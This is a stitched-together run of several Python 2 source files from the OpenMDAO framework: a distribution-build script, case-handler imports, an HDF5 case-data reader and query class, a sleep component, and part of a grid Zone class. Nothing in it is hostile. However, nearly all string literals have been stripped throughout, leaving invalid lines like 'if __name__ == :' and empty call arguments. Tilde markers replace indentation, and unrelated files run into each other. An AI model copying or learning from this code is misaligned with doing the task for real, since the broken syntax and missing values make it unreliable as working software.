~~~ shutil . copyfileobj ( resp . fp , easyf ) \n 
~~ print \n 
\n 
~~ print "Attempting to update %s to import from ez_setup" % setupfile \n 
\n 
if not os . path . isfile ( setupfile ) : \n 
~~~ raise IOError ( "can\'t find setup file \'%s\'" % setupfile ) \n 
\n 
~~ setupf = open ( setupfile , ) \n 
setup_contents = setupf . read ( ) \n 
setupf . close ( ) \n 
\n 
with open ( newsetupfile , ) as newf : \n 
~~~ newf . write ( "from ez_setup import use_setuptools\\n" ) \n 
newf . write ( "use_setuptools(download_delay=0)\\n\\n" ) \n 
newf . write ( setup_contents ) \n 
~~ ~~ finally : \n 
~~~ os . chdir ( startdir ) \n 
\n 
~~ return newsetupfile \n 
\n 
\n 
~~ def build_dist ( srcdir , destdir = , build_type = ) : \n 
~~~ """\n    Builds a distribution using the specified source directory and places\n    it in the specified destination directory.\n    \n    srcdir: str\n        Source directory for the distribution to be built.\n        \n    destdir: str\n        Directory where the built distribution file will be placed.\n\n    build_type: str\n        The type of distribution to be built.  Default is \'bdist_egg\'.\n    """ \n 
startdir = os . getcwd ( ) \n 
destdir = os . path . abspath ( os . path . expanduser ( destdir ) ) . replace ( , ) \n 
srcdir = os . path . abspath ( os . path . expanduser ( srcdir ) ) . replace ( , ) \n 
\n 
setupname = os . path . join ( srcdir , ) \n 
if not has_setuptools ( ) : \n 
~~~ setupname = make_new_setupfile ( setupname ) \n 
\n 
~~ dirfiles = set ( os . listdir ( destdir ) ) \n 
\n 
print "building distribution in %s" % srcdir \n 
\n 
cmd = [ sys . executable . replace ( , ) , \n 
os . path . basename ( setupname ) , \n 
] \n 
cmd . extend ( build_type . split ( ) ) \n 
cmd . extend ( [ , destdir ] ) \n 
\n 
os . chdir ( srcdir ) \n 
\n 
# FIXME: fabric barfs when running this remotely due to some unicode \n 
\n 
# a file with unicode stripped out  \n 
out = codecs . open ( , , \n 
encoding = , errors = ) \n 
\n 
print % . join ( cmd ) \n 
try : \n 
~~~ p = subprocess . Popen ( . join ( cmd ) , \n 
stdout = out , stderr = subprocess . STDOUT , \n 
shell = True ) \n 
p . wait ( ) \n 
~~ finally : \n 
~~~ out . close ( ) \n 
with open ( , ) as f : \n 
~~~ print f . read ( ) \n 
~~ os . chdir ( startdir ) \n 
\n 
~~ newfiles = set ( os . listdir ( destdir ) ) - dirfiles \n 
if len ( newfiles ) != 1 : \n 
~~~ raise RuntimeError ( "expected one new file in in destination directory but found %s" % \n 
list ( newfiles ) ) \n 
~~ if p . returncode != 0 : \n 
~~~ raise RuntimeError ( "problem building distribution in %s. (return code = %s)" % \n 
( srcdir , p . returncode ) ) \n 
\n 
~~ distfile = os . path . join ( destdir , newfiles . pop ( ) ) \n 
print % distfile \n 
return distfile \n 
\n 
~~ if __name__ == : \n 
~~~ parser = OptionParser ( usage = "%prog [OPTIONS]" ) \n 
parser . add_option ( "-s" , "--src" , action = "store" , type = , \n 
dest = , \n 
help = "name of directory where the distrib source files are located" ) \n 
parser . add_option ( "-d" , "--dest" , action = "store" , type = , \n 
dest = , default = , \n 
help = "name of directory where the build distrib will be placed" ) \n 
parser . add_option ( "-b" , "--bldtype" , action = "store" , type = , \n 
dest = , default = , \n 
help = "setup.py build command. Default is \'bdist_egg\'" ) \n 
\n 
( options , args ) = parser . parse_args ( sys . argv [ 1 : ] ) \n 
\n 
retcode = - 1 \n 
\n 
startdir = os . getcwd ( ) \n 
\n 
if not options . srcdir : \n 
~~~ print "you must supply a source directory" \n 
parser . print_help ( ) \n 
sys . exit ( retcode ) \n 
\n 
~~ srcdir = os . path . abspath ( os . path . expanduser ( options . srcdir ) ) \n 
destdir = os . path . abspath ( os . path . expanduser ( options . destdir ) ) \n 
\n 
if not os . path . exists ( srcdir ) : \n 
~~~ print "source directory %s not found" % srcdir \n 
sys . exit ( retcode ) \n 
\n 
~~ try : \n 
~~~ distfile = build_dist ( srcdir , destdir , options . buildtype ) \n 
~~ finally : \n 
~~~ os . chdir ( startdir ) \n 
\n 
\n 
~~ ~~ """\n\n.. _`openmdao.lib.casehandler.api.py`:\n\nA central place to access all of the OpenMDAO case recorders, case\niterators, and case filters in the standard library.\n""" \n 
\n 
from openmdao . lib . casehandlers . caseset import CaseArray , CaseSet , caseiter_to_caseset \n 
\n 
from openmdao . lib . casehandlers . csvcase import CSVCaseIterator , CSVCaseRecorder \n 
from openmdao . lib . casehandlers . dbcase import DBCaseIterator , DBCaseRecorder , case_db_to_dict \n 
from openmdao . lib . casehandlers . dumpcase import DumpCaseRecorder \n 
\n 
from openmdao . lib . casehandlers . jsoncase import JSONCaseRecorder , BSONCaseRecorder , verify_json \n 
\n 
from openmdao . lib . casehandlers . listcase import ListCaseRecorder , ListCaseIterator \n 
\n 
from openmdao . lib . casehandlers . caseset import CaseArray , CaseSet , caseiter_to_caseset \n 
\n 
from openmdao . lib . casehandlers . filters import SequenceCaseFilter , SliceCaseFilter , ExprCaseFilter \n 
\n 
from openmdao . lib . casehandlers . query import CaseDataset \n 
\n 
from openmdao . lib . casehandlers . csv_post_processor import caseset_query_to_csv \n 
from openmdao . lib . casehandlers . dump_post_processor import caseset_query_dump \n 
from openmdao . lib . casehandlers . html_post_processor import caseset_query_to_html \n 
\n 
try : \n 
~~~ from openmdao . lib . casehandlers . query_hdf5 import CaseDatasetHDF5 \n 
from openmdao . lib . casehandlers . hdf5case import HDF5CaseRecorder \n 
~~ except ImportError : \n 
~~~ pass \n 
~~ from weakref import ref \n 
\n 
import numpy as np \n 
\n 
from openmdao . main . api import VariableTree \n 
from openmdao . lib . casehandlers . query import DictList , ListResult \n 
\n 
_GLOBAL_DICT = dict ( __builtins__ = None ) \n 
\n 
class CaseDatasetHDF5 ( object ) : \n 
~~~ """\n    Reads case data from `filename` and allows queries on it.\n\n    To get all case data::\n\n        cds = CaseDataset(\'recorded.hdf5\', \'hdf5\')\n        cases = cds.data.fetch()\n\n    To get names of columns returned::\n\n        names = cds.data.var_names().fetch()\n\n    To select a specific set of variables::\n\n        cases = cds.data.vars([\'top.sub.comp.x, top.sub.comp.y\']).fetch()\n\n    To get a case and all its child cases::\n\n        cases = cds.data.parent_case(parent_itername).fetch()\n\n    To get cases for a particular driver::\n\n        cases = cds.data.driver(driver_name).fetch()\n\n    To get cases for a particular run of a particular driver::\n\n        cases = cds.data.driver(driver_name).parent_case(parent_itername).fetch()\n\n    Other possibilities exist, see :class:`QueryHDF5`.\n\n\n    """ \n 
\n 
def __init__ ( self , filename , format ) : \n 
~~~ format = format . lower ( ) \n 
if format == : \n 
~~~ self . _reader = _HDF5Reader ( filename ) \n 
~~ else : \n 
~~~ raise ValueError ( "dataset format must be \'hdf5\'" ) \n 
\n 
# TODO: Clean up some of the old _id variables that we do not use any more \n 
~~ self . _query_id = self . _query_itername = self . _parent_id = self . _parent_itername = self . _driver_id self . _case_ids = self . _drivers = self . _case_iternames = None \n 
self . metadata_names = [ , , , , , , ] \n 
\n 
~~ @ property \n 
def data ( self ) : \n 
~~~ """ :class:`Query` object. """ \n 
return QueryHDF5 ( self ) \n 
\n 
~~ @ property \n 
def drivers ( self ) : \n 
~~~ """ List of driver info dictionaries. """ \n 
return self . _reader . drivers ( ) \n 
\n 
~~ @ property \n 
def simulation_info ( self ) : \n 
~~~ """ Simulation info dictionary. """ \n 
return self . _reader . simulation_info \n 
\n 
~~ def _fetch ( self , query ) : \n 
~~~ """ Return data based on `query`. """ \n 
self . _setup ( query ) \n 
\n 
\n 
if query . vnames : \n 
~~~ tmp = [ ] \n 
for name in self . metadata_names : \n 
~~~ if name in query . vnames : \n 
~~~ tmp . append ( name ) \n 
~~ ~~ self . metadata_names = tmp \n 
names = query . vnames \n 
~~ else : \n 
~~~ if query . driver_name : \n 
#driver_info = self._drivers[self._driver_id] \n 
~~~ driver_info = self . _drivers [ self . _driver_name ] \n 
prefix = driver_info [ ] \n 
all_names = [ prefix + name \n 
for name in driver_info [ ] ] \n 
~~ else : \n 
~~~ all_names = [ ] \n 
for driver_info in self . _drivers . values ( ) : \n 
~~~ prefix = driver_info [ ] \n 
all_names . extend ( [ prefix + name \n 
for name in driver_info [ ] ] ) \n 
~~ ~~ names = sorted ( all_names + self . metadata_names ) \n 
\n 
~~ if query . names : \n 
# Returning single row, not list of rows. \n 
~~~ return names \n 
\n 
~~ nan = float ( ) \n 
rows = ListResult ( ) \n 
state = { } # Retains last seen values. \n 
for case_data in self . _reader . cases ( ) : \n 
~~~ data = case_data [ ] \n 
metadata = case_data [ ] \n 
case_id = metadata [ ] \n 
case_driver_id = metadata [ ] \n 
case_driver_name = metadata [ ] \n 
case_itername = metadata [ ] \n 
\n 
prefix = self . _drivers [ case_driver_name ] [ ] \n 
\n 
if prefix : \n 
# Make names absolute. \n 
~~~ pass \n 
#data = dict([(prefix+name, value) \n 
#            for name, value in data.items()]) \n 
~~ else : \n 
~~~ data = data . copy ( ) \n 
\n 
~~ state . update ( data ) \n 
\n 
# Filter on driver. \n 
if self . _driver_name is not None and case_driver_name != self . _driver_name : \n 
~~~ continue \n 
#if self._driver_id is not None and \\ \n 
#case_driver_id != self._driver_id: \n 
#continue \n 
\n 
## Filter on case. \n 
#if self._case_ids is None or case_id in self._case_ids: \n 
~~ if self . _case_iternames is None or case_itername in self . _case_iternames : \n 
~~~ for name in self . metadata_names : \n 
~~~ data [ name ] = case_data [ ] [ name ] \n 
\n 
~~ row = DictList ( names ) \n 
for name in names : \n 
~~~ if query . local_only : \n 
~~~ if name in self . metadata_names : \n 
~~~ row . append ( data [ name ] ) \n 
~~ else : \n 
~~~ driver = self . _drivers [ case_driver_name ] \n 
# driver = self._drivers[case_driver_id] \n 
lnames = [ prefix + rec for rec in driver [ ] ] \n 
if name in lnames : \n 
~~~ row . append ( data [ name ] ) \n 
~~ else : \n 
~~~ row . append ( nan ) \n 
~~ ~~ ~~ elif name in state : \n 
~~~ row . append ( state [ name ] ) \n 
~~ elif name in data : \n 
~~~ row . append ( data [ name ] ) \n 
~~ else : \n 
~~~ row . append ( nan ) \n 
~~ ~~ rows . append ( row ) \n 
\n 
#if case_id == self._query_id or case_id == self._parent_id: \n 
#break  # Parent is last case recorded. \n 
~~ if case_itername == self . _query_itername or case_itername == self . _parent_itername : \n 
~~~ break # Parent is last case recorded. \n 
\n 
~~ ~~ if self . _query_id and not rows : \n 
~~~ raise ValueError ( % self . _query_id ) \n 
\n 
~~ if query . transpose : \n 
~~~ tmp = DictList ( names ) \n 
for i in range ( len ( rows [ 0 ] ) ) : \n 
~~~ tmp . append ( [ row [ i ] for row in rows ] ) \n 
# Keep CDS as attribute for post-processing \n 
~~ tmp . cds = self \n 
return tmp \n 
\n 
# Keep CDS as attribute for post-processing \n 
~~ rows . cds = self \n 
return rows \n 
\n 
~~ def _write ( self , query , out , format ) : \n 
~~~ raise NotImplementedError \n 
\n 
~~ def _setup ( self , query ) : \n 
~~~ """ Setup for processing `query`. """ \n 
if query . vnames is not None : \n 
~~~ bad = [ ] \n 
metadata = self . simulation_info [ ] \n 
expressions = self . simulation_info [ ] \n 
for name in query . vnames : \n 
~~~ if name not in metadata and name not in [ e [ ] for e in expressions . values ~~~ bad . append ( name ) \n 
~~ ~~ if bad : \n 
~~~ raise RuntimeError ( % bad ) \n 
\n 
~~ ~~ self . _drivers = { } \n 
self . _driver_id = None \n 
self . _driver_name = None \n 
for driver_info in self . _reader . drivers ( ) : \n 
~~~ _id = driver_info [ ] \n 
name = driver_info [ ] \n 
prefix , _ , name = name . rpartition ( ) \n 
if prefix : \n 
~~~ prefix += \n 
~~ driver_info [ ] = prefix \n 
self . _drivers [ driver_info [ ] ] = driver_info \n 
if ( driver_info [ ] ) == query . driver_name : \n 
~~~ self . _driver_name = query . driver_name \n 
#self._driver_id = _id \n 
\n 
# self._drivers = {} \n 
# self._driver_id = None \n 
# for driver_info in self._reader.drivers(): \n 
\n 
\n 
\n 
#     if prefix: \n 
\n 
\n 
#     self._drivers[_id] = driver_info \n 
\n 
#         self._driver_id = _id \n 
\n 
~~ ~~ if query . driver_name : \n 
#if self._driver_id is None: \n 
~~~ if self . _driver_name is None : \n 
~~~ raise ValueError ( % query . driver_name ) \n 
\n 
~~ ~~ self . _case_ids = None \n 
self . _query_id = None \n 
self . _parent_id = None \n 
#if query.case_id is not None: \n 
#self._query_id = query.case_id \n 
#self._case_ids = set((self._query_id,)) \n 
##self._driver_id = None  # Case specified, ignore driver. \n 
#self._driver_name = None  # Case specified, ignore driver. \n 
if query . case_itername is not None : \n 
~~~ self . _query_itername = query . case_itername \n 
self . _case_iternames = set ( ( self . _query_itername , ) ) \n 
#self._driver_id = None  # Case specified, ignore driver. \n 
self . _driver_name = None # Case specified, ignore driver. \n 
\n 
\n 
#elif query.parent_id is not None: # TODO - fix this \n 
~~ elif query . parent_itername is not None : # TODO - fix this \n 
~~~ self . _parent_itername = query . parent_itername \n 
self . _case_iternames = set ( ( self . _parent_itername , ) ) \n 
parent_itername_parts = self . _parent_itername . split ( ) \n 
for case_data in self . _reader . cases ( ) : \n 
~~~ itername = case_data [ ] [ ] \n 
itername_parts = itername . split ( ) \n 
if len ( parent_itername_parts ) + 1 == len ( itername_parts ) and itername_parts [ : - 1 ] == ~~~ self . _case_iternames . add ( itername ) \n 
\n 
\n 
~~ ~~ ~~ ~~ def restore ( self , assembly , case_id ) : \n 
~~~ """ Restore case `case_id` into `assembly`. """ \n 
raise NotImplementedError \n 
\n 
\n 
~~ def _set ( self , assembly , name , value ) : \n 
~~~ """ Set `name` in `assembly` to `value`. """ \n 
# Translating unicode to str to avoid issues like pyOpt option checks. \n 
if isinstance ( value , dict ) : \n 
~~~ curr = assembly . get ( name ) \n 
if isinstance ( curr , VariableTree ) : \n 
~~~ for key , val in value . items ( ) : \n 
~~~ self . _set ( assembly , . join ( ( name , key ) ) , val ) \n 
~~ ~~ elif in name : \n 
~~~ if isinstance ( value , unicode ) : \n 
~~~ value = str ( value ) \n 
~~ exec ( % name , _GLOBAL_DICT , locals ( ) ) \n 
~~ else : \n 
~~~ for key , val in value . items ( ) : \n 
~~~ if isinstance ( val , unicode ) : \n 
~~~ value [ key ] = str ( val ) \n 
~~ ~~ assembly . set ( name , value ) \n 
~~ ~~ else : \n 
~~~ if isinstance ( value , unicode ) : \n 
~~~ value = str ( value ) \n 
~~ if in name : \n 
~~~ exec ( % name , _GLOBAL_DICT , locals ( ) ) \n 
~~ else : \n 
~~~ assembly . set ( name , value ) \n 
\n 
\n 
~~ ~~ ~~ ~~ class QueryHDF5 ( object ) : \n 
~~~ """\n    Retains query information for a :class:`CaseDataset`. All methods other\n    than :meth:`fetch` and :meth:`write` return ``self``, so operations are\n    easily chained.  If the same method is called more than once, only the last\n    call has an effect.\n    """ \n 
\n 
def __init__ ( self , dataset ) : \n 
~~~ self . _dataset = dataset \n 
self . driver_name = None \n 
self . case_id = None \n 
self . case_itername = None \n 
self . parent_id = None \n 
self . parent_itername = None \n 
self . vnames = None \n 
self . local_only = False \n 
self . names = False \n 
self . transpose = False \n 
\n 
~~ def fetch ( self ) : \n 
~~~ """ Return a list of rows of data, one for each selected case. """ \n 
return self . _dataset . _fetch ( self ) \n 
\n 
~~ def write ( self , out , format = None ) : \n 
~~~ """\n        Write filtered :class:`CaseDataset` to `out`, a filename or file-like\n        object.  Default `format` is the format of the original data file.\n        """ \n 
raise NotImplementedError \n 
#if format is None: \n 
#if isinstance(self._dataset._reader, _BSONReader): \n 
\n 
#else: \n 
\n 
#self._dataset._write(self, out, format) \n 
\n 
~~ def driver ( self , driver_name ) : \n 
~~~ """ Filter the cases to those recorded by the named driver. """ \n 
self . driver_name = driver_name \n 
return self \n 
\n 
~~ def case ( self , case_itername ) : \n 
~~~ """ Return this case. """ \n 
self . case_itername = case_itername \n 
self . parent_itername = None \n 
return self \n 
\n 
~~ def parent_case ( self , parent_case_id ) : \n 
~~~ """ Filter the cases to only include this case and its children. """ \n 
self . parent_id = parent_case_id \n 
self . parent_itername = parent_case_id \n 
self . case_id = None \n 
return self \n 
\n 
~~ def vars ( self , * args ) : \n 
~~~ """ Filter the variable columns returned in the row. """ \n 
self . vnames = [ ] \n 
for arg in args : \n 
~~~ if isinstance ( arg , basestring ) : \n 
~~~ self . vnames . append ( arg ) \n 
~~ else : \n 
~~~ self . vnames . extend ( arg ) \n 
~~ ~~ return self \n 
\n 
~~ def local ( self ) : \n 
~~~ """\n        Restrict the variables returned to only those in the specific driver\'s\n        local set. This means that if there are cases from more than one driver,\n        variables not local to that driver will be set to ``NaN``.\n        """ \n 
self . local_only = True \n 
return self \n 
\n 
~~ def by_case ( self ) : \n 
~~~ """\n        Have :meth:`fetch` return data as ``[case][var]`` (the default).\n        """ \n 
self . transpose = False \n 
return self \n 
\n 
~~ def by_variable ( self ) : \n 
~~~ """\n        Have :meth:`fetch` return data as ``[var][case]`` rather than the\n        default of ``[case][var]``.\n        """ \n 
self . transpose = True \n 
return self \n 
\n 
~~ def var_names ( self ) : \n 
~~~ """ Return  a list of the names of the variables in the cases. """ \n 
self . names = True \n 
return self \n 
\n 
\n 
\n 
\n 
~~ ~~ class _HDF5Reader ( object ) : \n 
~~~ """ Reads a :class:`HDF5CaseRecorder` file. """ \n 
\n 
def __init__ ( self , filename ) : \n 
~~~ import h5py # import it here to get rid of autodoc warning \n 
self . _inp = h5py . File ( filename , ) \n 
\n 
self . _simulation_info = self . read_simulation_info ( ) \n 
self . _state = \n 
self . _info = None \n 
\n 
~~ @ property \n 
def simulation_info ( self ) : \n 
~~~ """ Simulation info dictionary. """ \n 
return self . _simulation_info \n 
\n 
~~ def read_iteration_case_from_hdf5 ( self , hdf5file , driver_name , iteration_case_name ) : \n 
\n 
~~~ info = { } \n 
\n 
driver_grp = self . _inp [ ] [ driver_name ] \n 
iteration_grp = self . _inp [ ] [ driver_name ] [ iteration_case_name ] \n 
\n 
info [ ] = self . read_from_hdf5 ( iteration_grp [ ] ) \n 
\n 
data_grp = iteration_grp [ ] \n 
info [ ] = { } \n 
\n 
# read the names of the floats, ints and strings in the array_of_... arrays \n 
float_names = driver_grp [ ] \n 
int_names = driver_grp [ ] \n 
str_names = driver_grp [ ] \n 
for i , name in enumerate ( float_names ) : \n 
~~~ info [ ] [ name ] = data_grp [ ] [ i ] \n 
~~ for i , name in enumerate ( str_names ) : \n 
~~~ info [ ] [ name ] = data_grp [ ] [ i ] \n 
~~ for i , name in enumerate ( int_names ) : \n 
~~~ info [ ] [ name ] = data_grp [ ] [ i ] \n 
\n 
~~ for name in data_grp . keys ( ) : \n 
~~~ if name not in [ , , ] : \n 
~~~ if in data_grp [ name ] . attrs : \n 
~~~ info [ ] [ name ] = { } \n 
for n , v in data_grp [ name ] . items ( ) : \n 
~~~ info [ ] [ name ] [ n ] = self . read_from_hdf5 ( data_grp [ name ] [ n ] ) \n 
~~ ~~ info [ ] [ name ] = self . read_from_hdf5 ( data_grp [ name ] ) \n 
\n 
~~ ~~ return info \n 
\n 
~~ def read_from_hdf5 ( self , value ) : \n 
\n 
~~~ import h5py # do it here to avoid warning from autodoc in Sphinx \n 
\n 
# If value is an HDF5 Group do \n 
if isinstance ( value , h5py . _hl . group . Group ) : \n 
~~~ d = { } \n 
group = value \n 
# Loop over what is inside that group \n 
for name , value in group . attrs . items ( ) : \n 
~~~ d [ name ] = self . read_from_hdf5 ( value ) \n 
~~ for name , value in group . items ( ) : \n 
~~~ d [ name ] = self . read_from_hdf5 ( value ) \n 
~~ return d \n 
~~ elif value . dtype . names : # compound type \n 
~~~ d = { } \n 
for name in value . dtype . names : \n 
~~~ d [ name ] = value [ name ] [ 0 ] \n 
~~ return d \n 
~~ else : # it is just a value so return it \n 
~~~ return value [ ( ) ] \n 
\n 
~~ ~~ def read_simulation_info ( self ) : \n 
~~~ sim_info_grp = self . _inp [ ] # the HDF5 simulation_info group \n 
\n 
# This group contains: \n 
# attributes \n 
# other groups \n 
# datasets \n 
\n 
sim_info = { } \n 
\n 
# Loop over attributes \n 
for name , value in sim_info_grp . attrs . items ( ) : \n 
~~~ sim_info [ name ] = self . read_from_hdf5 ( value ) \n 
\n 
# Loop over non attributes. e.g. datasets and groups? \n 
~~ for name , value in sim_info_grp . items ( ) : \n 
~~~ sim_info [ name ] = self . read_from_hdf5 ( value ) \n 
\n 
~~ return sim_info \n 
\n 
# to get at attributes use \n 
\n 
\n 
\n 
\n 
# to get at non attributes \n 
\n 
\n 
\n 
~~ def drivers ( self ) : \n 
~~~ """ Return list of \'driver_info\' dictionaries. """ \n 
\n 
driver_info = [ ] \n 
\n 
\n 
for name in self . _inp . keys ( ) : \n 
~~~ if name . startswith ( ) : \n 
~~~ driver_info . append ( self . read_from_hdf5 ( self . _inp [ name ] ) ) \n 
\n 
~~ ~~ return driver_info \n 
\n 
~~ def cases ( self ) : \n 
~~~ """ Return sequence of \'iteration_case\' dictionaries. """ \n 
\n 
iteration_cases_grp = self . _inp [ ] \n 
case_timestamps = { } \n 
for driver_name in iteration_cases_grp : \n 
~~~ for iteration_case_name in iteration_cases_grp [ driver_name ] : \n 
~~~ if iteration_case_name . startswith ( ) : \n 
~~~ timestamp = iteration_cases_grp [ driver_name ] [ iteration_case_name ] [ ] [ case_timestamps [ timestamp ] = ( driver_name , iteration_case_name ) \n 
\n 
~~ ~~ ~~ sorted_timestamps = sorted ( case_timestamps ) \n 
for timestamp in sorted_timestamps : \n 
~~~ driver_name , iteration_case_name = case_timestamps [ timestamp ] \n 
info = self . read_iteration_case_from_hdf5 ( self . _inp , driver_name , iteration_case_name ) yield info \n 
\n 
\n 
\n 
~~ ~~ def _next ( self ) : \n 
~~~ """ Return next dictionary of data. """ \n 
pass \n 
~~ ~~ """\n    sleep_comp.py - component that does one thing and does it\n                     well. Sleep. \n\n                     Useful for slowing down a simulation to see\n                     what is happening\n""" \n 
\n 
# pylint: disable-msg=E0611,F0401 \n 
from openmdao . main . api import Component \n 
from openmdao . main . datatypes . api import Float \n 
\n 
import time \n 
\n 
class SleepComponent ( Component ) : \n 
~~~ """Sleep for a given number of secons""" \n 
\n 
# pylint: disable-msg=E1101 \n 
sleep_time = Float ( 0.0 , iotype = , desc = ) \n 
\n 
def execute ( self ) : \n 
~~~ time . sleep ( self . sleep_time ) \n 
~~ ~~ import copy \n 
\n 
from openmdao . lib . datatypes . domain . flow import FlowSolution \n 
from openmdao . lib . datatypes . domain . grid import GridCoordinates \n 
\n 
CARTESIAN = \n 
CYLINDRICAL = \n 
_COORD_SYSTEMS = ( CARTESIAN , CYLINDRICAL ) \n 
\n 
\n 
class Zone ( object ) : \n 
~~~ """ One zone in a possibly multi-zone :class:`DomainObj`. """ \n 
\n 
def __init__ ( self ) : \n 
~~~ self . grid_coordinates = GridCoordinates ( ) \n 
self . flow_solution = FlowSolution ( ) \n 
self . reference_state = None \n 
self . _coordinate_system = CARTESIAN \n 
self . right_handed = True \n 
self . symmetry = None \n 
self . symmetry_axis = None \n 
self . symmetry_instances = 1 \n 
\n 
~~ @ property \n 
def shape ( self ) : \n 
~~~ """ Coordinate index limits, not including \'ghost/rind\' planes. """ \n 
return self . grid_coordinates . shape \n 
\n 
~~ @ property \n 
def extent ( self ) : \n 
~~~ """ Coordinate ranges, not including \'ghost/rind\' planes. """ \n 
return self . grid_coordinates . extent \n 
\n 
~~ def _get_coord_sys ( self ) : \n 
~~~ return self . _coordinate_system \n 
\n 
~~ def _set_coord_sys ( self , sys ) : \n 
~~~ if sys in _COORD_SYSTEMS : \n 
~~~ self . _coordinate_system = sys \n 
~~ else : \n 
~~~ raise ValueError ( % sys ) \n 
\n 
~~ ~~ coordinate_system = property ( _get_coord_sys , _set_coord_sys , \n 
doc = ) \n 
\n 
def copy ( self ) : \n 
~~~ """ Returns a deep copy of self. """ \n 
return copy . deepcopy ( self ) \n 
\n 
~~ def is_equivalent ( self , other , logger , tolerance = 0. ) : \n 
~~~ """\n        Test if self and `other` are equivalent.\n\n        other: :class:`Zone`\n            Zone to check against.\n\n        logger: :class:`Logger` or None\n            Used to log debug messages that will indicate what if anything is\n            not equivalent.\n\n        tolerance: float\n            The maximum relative difference in array values to be considered\n            equivalent.\n        """ \n 
if not isinstance ( other , Zone ) : \n 
~~~ logger . debug ( ) \n 
return False \n 
\n 
~~ if self . coordinate_system != other . coordinate_system : \n 
~~~ logger . debug ( ) \n 
return False \n 
\n 
~~ if self . right_handed != other . right_handed : \n 
~~~ logger . debug ( ) \n 
return False \n 
\n 
~~ if self . symmetry != other . symmetry : \n 
~~~ logger . debug ( ) \n 
return False \n 
\n 
~~ if self . symmetry_axis != other . symmetry_axis : \n 
~~~ logger . debug ( ) \n 
return False \n 
\n 
~~ if self . symmetry_instances != other . symmetry_instances : \n 
~~~ logger . debug ( ) \n 
return False \n 
\n 
~~ if not self . grid_coordinates . is_equivalent ( other . grid_coordinates , \n 
logger , tolerance ) : \n 
~~~ return False \n 
\n 
~~ if not self . flow_solution . is_equivalent ( other . flow_solution , logger , \n 
tolerance ) : \n 
~~~ return False \n 
\n 
~~ return True \n 
\n 
~~ def extract ( self , imin , imax , jmin = None , jmax = None , kmin = None , kmax = None , \n 
grid_ghosts = None , flow_ghosts = None ) : \n 
~~~ """\n        Construct a new :class:`Zone` from grid and flow data extracted\n        from the specified region. Symmetry data is copied.\n\n        imin, imax, jmin, jmax, kmin, kmax: int\n            Specifies the region to extract neglecting ghost/rind planes.\n            Negative values are relative to the size in that dimension,\n            so -1 refers to the last element. For 2D zones omit kmin and kmax.\n            For 1D zones omit jmin, jmax, kmin, and kmax.\n\n        grid_ghosts: int[]\n            The number of ghost/rind planes for the new zone\'s grid.\n            If ``None`` the grid\'s existing specification is used.\n\n        flow_ghosts: int[]\n            The number of ghost/rind planes for the new zone\'s flow solution.\n            If ``None`` the flow\'s existing specification is used.\n        """ \n 
zone = Zone ( ) \n 
zone . grid_coordinates = self . grid_coordinates . extract ( imin , imax , jmin , jmax , kmin , kmax , \n 
grid_ghosts ) \n 
zone . flow_solution = self . flow_solution . extract ( imin , imax , jmin , jmax , kmin , kmax , \n 
flow_ghosts ) \n 
if self . reference_state is not None : \n 
~~~ zone . reference_state = self . reference_state . copy ( ) \n 
~~ zone . coordinate_system = self . coordinate_system \n 
zone . right_handed = self . right_handed \n 
zone . symmetry = self . symmetry \n 
zone . symmetry_axis = self . symmetry_axis \n 
zone . symmetry_instances = self . symmetry_instances \n 
return zone \n 
\n 
~~ def extend ( self , axis , delta , grid_points , flow_points , normal = None ) : \n 
~~~ """\n        Construct a new :class:`Zone` by linearly extending the grid and\n        replicating the flow. Symmetry data is copied.\n\n        axis: \'i\', \'j\', or \'k\'\n            Index axis to extend.\n\n        delta: float.\n            Fractional amount to move for each point. Multiplies the \'edge\'\n            delta in the `axis` direction or the appropriate component of\n            `normal`.  A negative value adds points before the current\n            zero-index of `axis`. \n\n        grid_points: int >= 0\n            Number of points to add in `axis` dimension.\n\n        flow_points: int >= 0\n            Number of points to add in `axis` dimension.\n\n        normal: float[]\n            For cases where only a single point exists in the `axis` direction,\n            this specifies the direction to move. If not specified, an\n            axis-aligned direction is selected based on minimum grid extent.\n        """ \n 
zone = Zone ( ) \n 
if grid_points > 0 : \n 
~~~ zone . grid_coordinates = self . grid_coordinates . extend ( axis , delta , grid_points , normal ) \n 
~~ else : \n 
~~~ zone . grid_coordinates = self . grid_coordinates . copy ( ) \n 
~~ if flow_points > 0 : \n 
~~~ zone . flow_solution = self . flow_solution . extend ( axis , delta , flow_points ) \n 
~~ else : \n 
~~~ zone . flow_solution = self . flow_solution . copy ( ) \n 
~~ if self . reference_state is not None : \n 
~~~ zone . reference_state = self . reference_state . copy ( ) \n 
~~ zone . coordinate_system = self . coordinate_system \n 
zone . right_handed = self . right_handed \n 
zone . symmetry = self . symmetry \n 
zone . symmetry_axis = self . symmetry_axis \n 
zone . symmetry_instances = self . symmetry_instances \n 
return zone \n 
\n 
~~ def make_cartesian ( self , axis = ) : \n 
~~~ """\n        Convert to Cartesian coordinate system.\n\n        axis: string\n            Specifies which is the cylinder axis (\'z\' or \'x\').\n        """ \n 
if self . coordinate_system != CARTESIAN : \n 
~~~ self . flow_solution . make_cartesian ( self . grid_coordinates , axis ) \n 
self . grid_coordinates . make_cartesian ( axis ) \n 
self . coordinate_system = CARTESIAN \n 
\n 
~~ ~~ def make_cylindrical ( self , axis = ) : \n 
~~~ """\n        Convert to cylindrical coordinate system.\n\n        axis: string\n            Specifies which is the cylinder axis (\'z\' or \'x\').\n        """ \n 
if self . coordinate_system != CYLINDRICAL : \n 
~~~ self . grid_coordinates . make_cylindrical ( axis ) \n 
self . flow_solution . make_cylindrical ( self . grid_coordinates , axis ) \n 
self . coordinate_system = CYLINDRICAL \n 
\n 
~~ ~~ def make_left_handed ( self ) : \n 
~~~ """ Convert to left-handed coordinate system. """ \n 
if self . right_handed : \n 
~~~ self . grid_coordinates . flip_z ( ) \n 
self . flow_solution . flip_z ( ) \n 
self . right_handed = False \n 
\n 
~~ ~~ def make_right_handed ( self ) : \n 
~~~ """ Convert to right-handed coordinate system. """ \n 
if not self . right_handed : \n 
~~~ self . grid_coordinates . flip_z ( ) \n 
self . flow_solution . flip_z ( ) \n 
self . right_handed = True \n 
\n 
~~ ~~ def translate ( self , delta_x , delta_y , delta_z ) : \n 
~~~ """\n        Translate coordinates.\n\n        delta_x, delta_y, delta_z: float\n            Amount of translation along the corresponding axis.\n        """ \n 
if self . coordinate_system == CARTESIAN : \n 
~~~ self . grid_coordinates . translate ( delta_x , delta_y , delta_z ) \n 
~~ else : \n 
~~~ raise RuntimeError ( ) \n 
\n 
~~ ~~ def rotate_about_x ( self , deg ) : \n 
~~~ """\n        Rotate about the X axis.\n\n        deg: float (degrees)\n            Amount of rotation.\n        """ \n 
if self . coordinate_system == CARTESIAN : \n 
